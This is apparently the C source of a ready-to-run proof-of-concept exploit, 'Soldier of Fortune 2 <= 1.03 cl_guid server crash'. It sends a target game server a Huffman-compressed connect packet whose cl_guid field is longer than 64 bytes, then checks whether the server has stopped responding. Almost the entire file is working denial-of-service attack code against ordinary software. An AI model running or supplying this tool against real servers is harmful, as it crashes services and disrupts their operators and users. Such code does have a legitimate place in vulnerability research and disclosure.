/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "q3huff.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #ifndef strcasestr  // avoid warnings
        extern char *strcasestr (__const char *__haystack, __const char *__needle)
     __THROW __attribute_pure__;
    #endif

    #define stristr strcasestr
#endif



#define VER         "0.1"
#define BUFFSZ      2048
#define PORT        20100
#define TIMEOUT     2
#define INFO        "\xff\xff\xff\xff" "getinfo xxx\n"
#define GETCH       "\xff\xff\xff\xff" "getchallenge\n"
#define CONNECT     "\xff\xff\xff\xff" \
                    "connect \"" \
                    "\\challenge\\%s" \
                    "\\qport\\%d" \
                    "\\protocol\\%d" \
                    "\\cl_guid\\%s"\
                    "\\name\\%s" \
                    "\\rate\\4500" \
                    "\\snaps\\20" \
                    "\\identity\\marinesoldier1" \
                    "\\cl_anonymous\\0" \
                    "\\cg_predictItems\\1" \
                    "\\details\\5" \
                    "\\cl_punkbuster\\%c" \
                    "\""

#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                      < 0) std_err();
#define RECV        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                    if(len < 0) std_err();
#define RECVT       if(timeout(sd) < 0) { \
                        fputs("\nError: socket timeout, no reply received\n\n", stdout); \
                        exit(1); \
                    } \
                    RECV;



int create_hex_rand_string(u_char *data, int len, u_int tmp, int more);
int getproto(u_char *buff);
char getpunkb(u_char *buff);
void showinfo(u_char *data);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u_int   seed;
    int     sd,
            len,
            proto;
    u_short port = PORT;
    u_char  buff[BUFFSZ + 1],
            cl_guid[]  =    // something bigger than 64 bytes
                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            challenge[32],
            nick[]     =
                "0123456789abcdef",
            punkbuster = 0;


    setbuf(stdout, NULL);

    fputs("\n"
        "Soldier of Fortune 2 <= 1.03 cl_guid server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <server> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif    

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("- request informations:\n", stdout);
    SEND(INFO, sizeof(INFO) - 1);
    RECVT;
    buff[len] = 0x00;

    proto      = getproto(buff);
    punkbuster = getpunkb(buff);
    showinfo(buff);

    fputs("- request challenge:\n", stdout);
    SEND(GETCH, sizeof(GETCH) - 1);
    RECVT;
    buff[len] = 0x00;
    if(!stristr(buff, "challenge")) {
        fputs("\nError: no challenge string, try again\n\n", stdout);
        exit(1);
    }
    strncpy(challenge, buff + 22, sizeof(challenge) - 1);
    printf("- challenge: %s\n", challenge);

    seed = ~time(NULL);
    seed = create_hex_rand_string(nick, sizeof(nick) - 1, seed, 1);
    seed = create_hex_rand_string(cl_guid, sizeof(cl_guid) - 1, seed, 0);

    fputs("- send BOOM cl_guid\n", stdout);
    len = snprintf(
        buff,
        BUFFSZ,
        CONNECT,
        challenge,
        seed,
        proto,
        cl_guid,
        nick,
        punkbuster);
    if((len < 0) || (len > BUFFSZ)) len = BUFFSZ;

    len = Huff_CompressPacket(buff, 12, len);
    SEND(buff, len);
    if(timeout(sd) < 0) {
        fputs("- timeout, resend again\n", stdout);
        SEND(buff, len);
    }
    if(!timeout(sd)) {
        RECV;
        buff[len] = 0x00;
        printf("\n* Message from server:\n  %s\n", buff + 4);
    }

    fputs("- check server:\n", stdout);
    SEND(INFO, sizeof(INFO) - 1);
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }
    close(sd);

    return(0);
}



int create_hex_rand_string(u_char *data, int len, u_int tmp, int more) {
    if(!tmp) tmp++;
    if(more) {
        len = tmp % len;
        if(!len) len++;
    }
    while(len--) {
        tmp = (*data + tmp) % 16;
        if(tmp <= 9) {
            *data = tmp + '0';
        } else {
            *data = (tmp - 10) + 'A';
        }
        data++;
    }
    *data = 0x00;
    return(tmp << 1);
}



int getproto(u_char *buff) {
    int     p;
    u_char  *ptr;

    ptr = stristr(buff, "\\protocol\\");
    if(!ptr) {
        fputs("\n"
            "Error: No protocol informations in the answer of the server\n"
            "       Is impossible to continue without this information\n"
            "\n", stdout);
        exit(1);
    }
    p = atoi(strchr(ptr + 1, '\\') + 1);
    return(p);
}    



char getpunkb(u_char *buff) {
    int     p;
    u_char  *ptr;

    ptr = stristr(buff, "\\punkbuster\\");
    if(!ptr) ptr = stristr(buff, "\\pb\\");
    if(ptr) {
        p = *(strchr(ptr + 1, '\\') + 1);
    } else p = '0';

    return(p);
}



void showinfo(u_char *data) {
    int     nt = 1;
    u_char  *p;

    while((p = strchr(data, '\\'))) {
        *p = 0x00;
        if(!nt) {
            printf("%30s: ", data);
            nt++;
        } else {
            printf("%s\n", data);
            nt = 0;
        }
        data = p + 1;
    }
    printf("%s\n\n", data);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


